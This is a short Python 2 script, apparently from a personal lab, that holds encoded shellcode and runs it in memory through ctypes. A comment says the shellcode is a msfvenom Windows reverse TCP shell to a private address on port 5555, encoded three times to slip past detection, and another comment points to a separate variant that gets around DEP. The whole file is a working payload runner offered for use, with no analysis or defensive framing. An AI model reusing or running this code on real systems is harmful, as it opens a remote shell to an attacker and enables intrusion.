#!/usr/bin/env python2
from ctypes import *

# NO DEP
# Doesn't work on my test box (Win 7 x86 SP1);  
# Complains about Access violation trying to write to addy 0x? whatever
# see AEP_revshell_win_dep.py instead

sc = ("\xda\xca\x89\xe0\xd9\x70\xf4\x5e\x6a\x4d\x03\x34\x24\x58\x56"
"\x5a\x6a\x02\x03\x14\x24\x58\x68\x16\xff\xff\xff\x5d\xf7\xd5"
"\x0f\xb7\x3a\x81\xea\xfe\xff\xff\xff\x8b\x0e\xc1\xe1\x10\xc1"
"\xe9\x10\x89\xc8\x09\xf8\x21\xf9\xf7\xd1\x21\xc1\x66\x51\x66"
"\x8f\x06\x81\xee\xfe\xff\xff\xff\x4d\x85\xed\x0f\x85\xd1\xff"
"\xff\xff\xbd\xb7\x66\x7f\xef\x9f\x36\xef\xc2\xb2\xa8\xf0\xab"
"\xdc\x8f\x84\x06\x6d\x8b\x24\x89\x4c\xb1\xb3\x4e\x4c\x10\xbb"
"\xc6\x44\xf7\x1b\x36\xfc\x26\x3d\xc9\x2d\x44\x64\x46\xef\x13"
"\xef\xd2\x0d\xc2\xcc\x28\xdc\x19\x26\x7f\xaf\x2a\xaf\xa9\x6a"
"\xab\x24\x2e\xd2\x21\x57\xf8\xa8\x07\x57\xc0\x42\xef\xa8\x3f"
"\xbd\x10\x68\x60\xd7\x15\x31\x49\x18\x7f\x79\x4a\x24\x5b\x20"
"\x1d\x7a\xda\xce\xe3\x85\x25\x31\xd2\x5e\x43\x8a\x70\x5e\xc8"
"\x8c\xb1\xbe\xd8\x4d\x59\xae\x59\xa3\xa7\x51\xa6\x5c\x58\x66"
"\xfc\x9d\xba\x76\x3d\x77\xaa\x47\xff\x11\x23\x50\x7c\xd6\x21"
"\x1b\xf9\x0d\x2e\x9e\x21\xf2\xd1\x61\x33\x0e\x3f\x75\x5f\x1a"
"\x53\x61\x53\x87\xba\xcd\x7a\x4f\x18\x55\xe8\x5c\xd8\x4a\xa3"
"\x11\x87\x8c\x8e\xff\xa5\xd5\xe6\x80\xfc\x55\x13\x3c\x68\x95"
"\x85\xd0\xde\xb8\xfc\xf0\xa6\x5f\x66\xe5\x6e\x1d\x25\xf5\x3d"
"\x86\x3c\x52\xaf\x6d\xbf\xc1\xcf\xb6\xde\xcb\xff\x37\xb7\x6a"
"\x97\x45\x54\x51\x6c\x9d\x95\xc0\x26\x38\x54\x64\x31\xad\xbc"
"\x5d\x18\x5b\x98\xaa\xfb\x94\x9b\x10\x0e\x2d\x13\x51\xbd\x11"
"\x84\x18\xce\x00\x7c\x51\x12\x48\x73\x7f\x96\x6a\xbc\xd6\x01"
"\xdf\x2a\xb0\x1c\xbd\xbc\xd3\x5a\x57\xbe\x1d\x7c\xc2\xc3\xe9"
"\x58\x6c\xb6\xb8\xcd\x62\x7c\xec\x8c\x24\xd6\x27\x7b\x87\x12"
"\xb6\xbf\x16\xbe\x50\x60\xc2\x3e\xd0\x88\x0e\xa1\x3a\x10\x1b"
"\xec\x97\xcd\xb7\x31\x3b\x39\xdf\x91\x03\xf1\xce\xd9\x79\xb9"
"\x4b\x44\xac\x74\xce\xd9\x69\xb9\x4b\x44\x84\xce\xa9\xec\x86"
"\x99\x7e\x2c\x3b\x5c\xab\x29\x46\x61\x62\x7c\x8d\x34\xbc\x9a"
"\xda\x34\x81\x8a\xb1\x73\x82\x54\x17\xd9\x45\x01\x05\x09\x97"
"\xa5\xdb\x52\x07\xf6\x3e\xed\x8a\xb9\x06\x00\xe4\xab\xbd\x7a"
"\x3c\xbc\x01\x6d\x09\x48\x63\xce\x3c\xda\xa0\x36\xed\x7b\x27"
"\x75\x97\x5e\x9a\x14\x0e\x03\x02\x48\x1b\x1b\x33\x40\xec\x13"
"\x80\x1c\x0f\x19\x35\x40\xfc\x13\x88\x1c\x17\x1c\x35\x7b\xd3"
"\xb7\xce\x56\xd7\x4f\x43\x4e\x14\x01\xc6\xff\xa1\xd8\x7b\xa1"
"\x01\xe6\x24\x4a\xe5\xfd\x75\xf3\xe2\x2c\xd4\xb7\xfe\xf5\x37"
"\xbb\x21\xff\x94\xbb\x02\x04\x57\x35\xc4\x31\xd6\x13\x37\x78"
"\x4f\x5a\xfd\xce\x50") # len 545 
# msfvenom -p windows/shell_reverse_tcp LHOST='192.168.56.180' LPORT=5555 -e x86/bloxor -i 3 -f c

code = create_string_buffer(sc, len(sc))
shell = cast(code, CFUNCTYPE(c_void_p))
shell()


